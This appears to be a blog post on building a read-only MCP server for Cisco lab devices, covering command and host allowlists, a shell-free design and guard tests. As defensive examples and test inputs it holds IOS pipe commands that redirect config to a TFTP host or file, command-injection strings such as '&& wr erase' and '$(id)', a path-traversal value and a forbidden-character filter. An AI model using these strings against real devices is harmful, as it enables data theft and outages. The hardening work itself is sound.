---
title: A read-only MCP server for network devices
tags: Automation
---

The Cloud Security Alliance published a note this month on the state of MCP server security, and the number that stuck with me was the count of publicly reachable servers exposing command execution through the STDIO transport. The pattern is familiar: a new integration layer arrives, everyone wires it to something important, and the security model arrives about eighteen months later.

Meanwhile the pressure to put an LLM in front of network infrastructure is real and not unreasonable. "Which interfaces on the leaf switches are down" is a question that should not require someone to SSH into fourteen boxes.

So the useful exercise is not whether to expose the network to an agent, but how to expose it so that the worst case is a wrong answer rather than an outage. This is a working read-only MCP server over a lab of Cisco IOL nodes, and more importantly, the reasoning behind each guardrail.

Everything below was tested against IOS 17.12.1 running in EVE-NG.

## The SDK renamed the thing every tutorial uses

Start with a practical trap. Almost every MCP tutorial currently online opens with:

```python
from mcp.server.fastmcp import FastMCP
```

On the current SDK that raises `ModuleNotFoundError`. `FastMCP` was renamed to `MCPServer` in 2.x:

```python
from mcp.server.mcpserver import MCPServer   # 2.x
```

If you are following a tutorial and hitting an import error, that is why. Pin `mcp<2` to keep older code running, or use the new name. Tested here on `mcp 2.2.0` and `netmiko 4.7.0` under Python 3.11.

## "Only allow show commands" is not enough

The obvious first guardrail is to reject anything that is not a `show` command:

```python
if not command.strip().lower().startswith("show "):
    raise Refused("only show commands are permitted")
```

This feels sufficient and is not. All of the following pass that check:

```
show running-config | include password
show version | redirect tftp://10.0.0.1/loot
show running-config | append flash:exfil.txt
```

IOS pipe modifiers turn a read into a filter, and `redirect`/`append`/`tee` turn a read into a write to somewhere else. A prefix check inspects the first word of a string whose meaning is determined by the rest of it.

The second problem is abbreviation. IOS accepts `sh ver`, `sho ru`, and every unambiguous prefix in between. If your allowlist accepts abbreviations you have committed to reimplementing Cisco's command parser well enough to know what an arbitrary fragment expands to — on every platform and version you touch.

So: exact strings, fully spelled, enumerated in advance.

```python
ALLOWED_COMMANDS = frozenset({
    "show ip interface brief",
    "show interfaces status",
    "show ip bgp summary",
    "show bgp ipv4 unicast summary",
    "show ip route summary",
    "show version",
    "show inventory",
    "show cdp neighbors",
    "show ip ospf neighbor",
})

FORBIDDEN_CHARS = re.compile(r"[;|&`$><\n\r]")

def validate_command(command: str) -> str:
    normalised = " ".join(command.strip().lower().split())
    if FORBIDDEN_CHARS.search(command):
        raise Refused("command contains forbidden characters")
    if not normalised.startswith("show "):
        raise Refused("only show commands are permitted")
    if normalised not in ALLOWED_COMMANDS:
        raise Refused(f"command not in allowlist: {normalised!r}")
    return normalised
```

Whitespace is normalised so `  SHOW   VERSION  ` matches, because rejecting a valid command over spacing teaches users to fight the tool. The character filter is redundant given the set membership check, and it stays anyway — it fails earlier and more legibly, and it survives someone later adding a parameterised command to the allowlist.

`sh ver` is refused. That is deliberate and worth saying out loud in your docs, because it is the first complaint you will get.

## Config sections: enumerate, never interpolate

Returning a section of the running config is genuinely useful and is where free-text input is most tempting:

```python
command = f"show running-config | section {section}"   # do not do this
```

If `section` comes from a caller, this hands them the pipe. The fix is an allowlist of sections rather than validation of arbitrary text:

```python
ALLOWED_CONFIG_SECTIONS = frozenset({
    "interface", "router bgp", "router ospf",
    "ip route", "vlan", "line vty",
})
```

Credentials, keys and `username` lines are then out of reach by construction rather than by filtering. A blocklist of sensitive sections would need to anticipate every way a secret can appear in a config; an allowlist only needs to enumerate what is safe to return.

## The device inventory is a guardrail too

A hostname regex is not access control. If the server accepts any syntactically valid host, it becomes a pivot: anything the server can route to, the caller can reach.

```python
INVENTORY = {f"r{n}": f"192.168.1.{n}" for n in range(110, 124)}

def resolve_device(host: str) -> Device:
    if not VALID_HOST.match(host):
        raise Refused(f"invalid host format: {host!r}")
    if host not in INVENTORY:
        raise Refused(f"host not in inventory: {host!r}")
    return Device(name=host, host=INVENTORY[host])
```

The caller supplies a key, not an address. `8.8.8.8` is refused not because it looks wrong but because it is not in the inventory.

## No shell anywhere in the path

The CSA finding concerned STDIO transports interpolating strings into OS commands. That entire class disappears if there is no shell in the path at all. netmiko opens SSH directly and takes the command as an argument:

```python
with ConnectHandler(**params) as conn:
    return conn.send_command(command)
```

No `subprocess`, no `shell=True`, no string interpolation into anything a shell will parse. Credentials come from the environment and the server refuses to start without them:

```python
for var in ("NET_USER", "NET_PASS"):
    if var not in os.environ:
        raise SystemExit(f"{var} is not set; refusing to start")
```

## Declaring the tools

Each tool is a thin wrapper: resolve the device, validate the command, run it. The annotations let a client see the tools are non-mutating rather than inferring it from names:

```python
mcp = MCPServer(
    name="netops-readonly",
    instructions=(
        "Read-only access to lab network devices. Every tool runs a fixed "
        "show command from an allowlist. No configuration changes are "
        "possible through this server."
    ),
)

READ_ONLY = ToolAnnotations(
    readOnlyHint=True, destructiveHint=False, idempotentHint=True
)

@mcp.tool(description="List interfaces and their IP/status for one device.",
          annotations=READ_ONLY)
def get_interfaces(host: str) -> str:
    device = resolve_device(host)
    command = validate_command("show ip interface brief")
    return run_show(device, command)
```

Note that `get_interfaces` takes no command argument. The command is fixed in the function body; the only caller-controlled value is the device key. Most read-only tools should look like this. `get_running_config_section` is the exception, and it takes an enumerated section rather than free text.

Sessions are opened per call and closed immediately. A pooled connection is faster and becomes a shared mutable resource across callers, which is not a trade worth making for a tool that runs a handful of show commands.

## Test the guards, not just the happy path

The tests that matter are the ones asserting that bad input is refused. Running the suite against the live lab:

```
=== COMMAND GUARD ===
  refused: 'show version; reload' -> command contains forbidden characters
  refused: 'show run | include password' -> command contains forbidden characters
  refused: 'show version && wr erase' -> command contains forbidden characters
  refused: 'show version | redirect tftp://10.0.0.1/out' -> ...
  refused: 'show running-config' -> command not in allowlist
  refused: 'configure terminal' -> only show commands are permitted
  refused: 'sh ver' -> only show commands are permitted
  refused: 'show version\nconfigure terminal' -> forbidden characters
  refused: 'show version `id`' -> forbidden characters
  refused: 'show version $(id)' -> forbidden characters
  allowed: 'show version' -> 'show version'
  allowed: '  SHOW   VERSION  ' -> 'show version'

=== HOST GUARD ===
  refused: 'r999'          refused: '8.8.8.8'
  refused: '../../etc/passwd'   refused: 'r122; reload'

FAILURES: 0
```

And the live read through the actual tool function:

```
Interface              IP-Address      OK? Method Status      Protocol
Ethernet0/0            unassigned      YES NVRAM  up          up
Ethernet3/0            192.168.1.122   YES NVRAM  up          up
```

Every hostile string is refused by a specific rule with a specific message, and the legitimate paths return real device output.

## What this does not do

It has no authentication of its own — anyone who can reach the server gets the tools. In a lab that is fine; anywhere else it needs to sit behind the transport's auth, and the SDK's `auth` parameter exists for that.

It has no rate limiting, so an enthusiastic agent can open a lot of SSH sessions quickly. It has no audit log, which is the first thing I would add for anything beyond a lab: who asked, which tool, which device, what came back.

And it is genuinely read-only, which is the point. The moment someone asks for a write tool, the entire threat model changes and the answer is not to add it to this server. It is to build a second one with approval gates, and to keep the read path unable to change anything at all.

The value of the read-only version is that it can be deployed while that argument is still being had.
